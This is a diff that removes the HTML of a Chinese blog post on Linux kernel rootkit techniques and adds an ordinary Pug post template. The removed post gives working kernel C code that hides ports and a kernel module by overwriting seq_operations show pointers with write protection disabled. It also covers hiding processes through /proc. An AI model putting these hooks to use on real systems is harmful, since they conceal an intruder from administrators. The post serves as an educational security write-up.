-<p>  但是实际测试一下，发现这没有起作用，而且发现当我们勾去了整个根目录的时候，大部分在根目录的子目录，当我们执行<strong>ls</strong> 时，都会被勾去，但不部分目录如<strong>/proc</strong>和<strong>sys</strong>却没有。于是我吧勾取的目录改到了<strong>/proc</strong>。可以达到隐藏进程的目的。</p>
-<h2 id="隐藏端口"><a href="#隐藏端口" class="headerlink" title="隐藏端口"></a>隐藏端口</h2><ul>
-<li><p>还是文件。。。端口信息是在/proc/net/下的，根据协议来分的。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、/proc/net/tcp</span><br><span class="line"><span class="number">2</span>、/proc/net/tcp6</span><br><span class="line"><span class="number">3</span>、/proc/net/udp</span><br><span class="line"><span class="number">4</span>、/proc/net/udp6</span><br></pre></td></tr></table></figure>
-<p>然后，具体钩子的布置，看一下内核是怎么处理的。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">size_t</span> from;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">    <span class="keyword">size_t</span> pad_until;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">loff_t</span> read_pos;</span><br><span class="line">    u64 version;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">    <span class="keyword">int</span> poll_event;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p><strong>seq_file</strong>类似于<strong>file</strong>结构，<strong>seq_operation</strong>结构类似于之前<strong>file_operation</strong>结构。show函数就是我们需要改写的。</p>
-<p>这里从什么地方改写show，参考<strong>后面的第一个链接</strong>，发现不行。查阅了源码发现相关的结构有改动。我看到一个<strong>seq_read -&gt; traverse -&gt; show</strong>的调用链，做了些调整。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> seq_read(struct file *file, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> = <span class="title">file</span>-&gt;<span class="title">private_data</span>;</span>    <span class="comment">//由file可得</span></span><br><span class="line">    <span class="comment">/* Don't assume *ppos is where we left it */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*ppos != m-&gt;read_pos)) &#123;</span><br><span class="line">        <span class="keyword">while</span> ((err = traverse(m, *ppos)) == -EAGAIN)</span><br><span class="line">            ;</span><br><span class="line">..................</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(seq_read);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">traverse</span><span class="params">(struct seq_file *m, <span class="keyword">loff_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...................</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!m-&gt;buf) &#123;</span><br><span class="line">        m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;buf)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        error = PTR_ERR(p);</span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(p))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        error = m-&gt;op-&gt;show(m, p);<span class="comment">/*由file 结构 访问 show()*/</span></span><br><span class="line">           .....................</span><br><span class="line">           pos += m-&gt;count;        <span class="comment">/*更新下一次的buf起始地址*/</span></span><br><span class="line">        m-&gt;count = <span class="number">0</span>;            <span class="comment">/*count每次循环置0*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>有个坑，就是注意到seq_file下的seq_operations是const，也就是只读的，没法直接赋值，所以我们需要指针的方式修改。具体代码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> set_afinfo_seq_op(func, path, new, old)   </span></span><br><span class="line">    <span class="keyword">do</span> &#123;                                                        </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>;</span>                                      </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">p</span>;</span>                                     </span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span>* tmp;                                        </span><br><span class="line">        filp = filp_open(path, O_RDONLY, <span class="number">0</span>);                    </span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(filp)) &#123;                                     </span><br><span class="line">            fm_alert(<span class="string">"Failed to open %s with error %ld.n"</span>,     </span><br><span class="line">                     path, PTR_ERR(filp));                      </span><br><span class="line">            old = <span class="literal">NULL</span>;                                         </span><br><span class="line">        &#125;                                                       </span><br><span class="line">        p = filp-&gt;private_data;                                    </span><br><span class="line">        old = p-&gt;op-&gt;func;                                          </span><br><span class="line">        fm_alert(<span class="string">"Setting seq_op-&gt;"</span> #func <span class="string">" from 0x%lx to 0x%lx."</span>, </span><br><span class="line">                 old, <span class="keyword">new</span>);                                     </span><br><span class="line">        disable_wp();                                            </span><br><span class="line">        tmp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*) &amp;(p-&gt;op-&gt;func);                  </span><br><span class="line">        *(tmp) = <span class="keyword">new</span>;                                            </span><br><span class="line">        enable_wp();                                            </span><br><span class="line">                                                                </span><br><span class="line">        filp_close(filp, <span class="number">0</span>);                                    </span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-<p>具体的show怎么改写，可以先看看tcp_ipv4.c下的show是怎么实现的，我们只需要知道如何过滤即可。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tcp4_seq_show</span><span class="params">(struct seq_file *seq, <span class="keyword">void</span> *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcp_iter_state</span> *<span class="title">st</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">v</span>;</span></span><br><span class="line">    <span class="comment">/*这里是为每一条记录设置填充长度，填充到TMPSZ（150）对齐*/</span></span><br><span class="line">    seq_setwidth(seq, TMPSZ - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/*第一行的内容，标注每个字段的含义*/</span></span><br><span class="line">    <span class="keyword">if</span> (v == SEQ_START_TOKEN) &#123;</span><br><span class="line">        seq_puts(seq, <span class="string">"  sl  local_address rem_address   st tx_queue "</span></span><br><span class="line">               <span class="string">"rx_queue tr tm-&gt;when retrnsmt   uid  timeout "</span></span><br><span class="line">               <span class="string">"inode"</span>);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    st = seq-&gt;<span class="keyword">private</span>;</span><br><span class="line">    <span class="comment">/*分类处理*/</span></span><br><span class="line">    <span class="keyword">if</span> (sk-&gt;sk_state == TCP_TIME_WAIT)</span><br><span class="line">        get_timewait4_sock(v, seq, st-&gt;num);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sk-&gt;sk_state == TCP_NEW_SYN_RECV)</span><br><span class="line">        get_openreq4(v, seq, st-&gt;num);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        get_tcp4_sock(v, seq, st-&gt;num);</span><br><span class="line">out:</span><br><span class="line">    <span class="comment">/*根据之前设置的填充长度，用空格填充，最后空行结束一条记录*/</span></span><br><span class="line">    seq_pad(seq, <span class="string">'n'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*举一例*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">get_timewait4_sock</span><span class="params">(<span class="keyword">const</span> struct inet_timewait_sock *tw,</span></span></span><br><span class="line"><span class="function"><span class="params">                   struct seq_file *f, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> delta = tw-&gt;tw_timer.expires - jiffies;</span><br><span class="line">    __be32 dest, src;</span><br><span class="line">    __u16 destp, srcp;</span><br><span class="line"></span><br><span class="line">    dest  = tw-&gt;tw_daddr;</span><br><span class="line">    src   = tw-&gt;tw_rcv_saddr;</span><br><span class="line">    destp = ntohs(tw-&gt;tw_dport);</span><br><span class="line">    srcp  = ntohs(tw-&gt;tw_sport);</span><br><span class="line">    <span class="comment">/*这就是在缓冲区里填充的格式*/</span></span><br><span class="line">    seq_printf(f, <span class="string">"%4d: %08X:%04X %08X:%04X"</span></span><br><span class="line">        <span class="string">" %02X %08X:%08X %02X:%08lX %08X %5d %8d %d %d %pK"</span>,</span><br><span class="line">        i, src, srcp, dest, destp, tw-&gt;tw_substate, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="keyword">jiffies_delta_to_clock_t</span>(delta), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        refcount_read(&amp;tw-&gt;tw_refcnt), tw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>每一次向缓冲区输出时，都会更新seq-&gt;count的大小（缓冲区的长度），buf每次根据show结束的seq-&gt;count的大小，移动pos指针。所以我们只需要在show之后检查到了需要过滤的端口，将该条记录的长度减去就得了。</p>
-<p>简单的fake_seq_show的代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">fake_seq_show(struct seq_file *seq, <span class="keyword">void</span> *v)</span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">int</span> last_len, this_len;</span><br><span class="line">    <span class="comment">//当前记录的长度</span></span><br><span class="line">    last_len = seq-&gt;count;</span><br><span class="line">    ret = real_seq_show(seq, v);</span><br><span class="line">    this_len = seq-&gt;count - last_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断是否存在我们需要过滤的端口信息</span></span><br><span class="line">    <span class="keyword">if</span> (strnstr(seq-&gt;buf + last_len, SECRET_MODULE, this_len)) &#123;</span><br><span class="line">        fm_alert(<span class="string">"Hiding module: %sn"</span>, SECRET_MODULE);</span><br><span class="line">    <span class="comment">//删除记录</span></span><br><span class="line">        seq-&gt;count -= this_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>测试效果，以tcp6、22端口为例</p>
-<p><a href="https://p2.ssl.qhimg.com/t010849dea7e8c7479e.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t010849dea7e8c7479e.png" alt="img"></a></p>
-</li>
-</ul>
-<h2 id="隐藏内核模块"><a href="#隐藏内核模块" class="headerlink" title="隐藏内核模块"></a>隐藏内核模块</h2><p>  模块的查看方式及来源</p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、lsmod   来源于文件/proc/<span class="keyword">module</span></span><br><span class="line"><span class="number">2</span>、/sys/<span class="keyword">module</span>  来源......就不用再说了吧</span><br></pre></td></tr></table></figure>
-<p>  第二种就类似于文件隐藏，不多说</p>
-<p>  隐藏lsmod的查看，在于/proc/module，其实和上面二点隐藏端口的方式类似。</p>
-<p>  可以看一下系统处理的整个调用链，和端口的处理类似，一样用的seq_operation结构体，只是初始的函数指针不同。</p>
-<p>  所以我们可以使用和隐藏端口一样的方式来达到目的，只是入口的目录和过滤规则变了。</p>
-<p>  效果如下，隐藏了我们自己的module</p>
-<p>  <a href="https://p3.ssl.qhimg.com/t014b36866c47393b92.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t014b36866c47393b92.png" alt="img"></a></p>
-<h4 id="继言"><a href="#继言" class="headerlink" title="继言"></a>继言</h4><ul>
-<li><p>之后再看看有什么好玩的可以在内核里做的，会持续和大家分享。</p>
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4></li>
-<li><p>强烈推荐：本篇文章绝大部分学习于<a href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit" target="_blank" rel="noopener">Linux Rookit系列</a></p>
-<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5></li>
-<li><p>本文首发自<a href="https://www.anquanke.com/post/id/195318" target="_blank" rel="noopener">安全客</a></p>
-</li>
-</ul>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-            <a href="../../../../tags/Rootkit/">Rootkit</a>
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
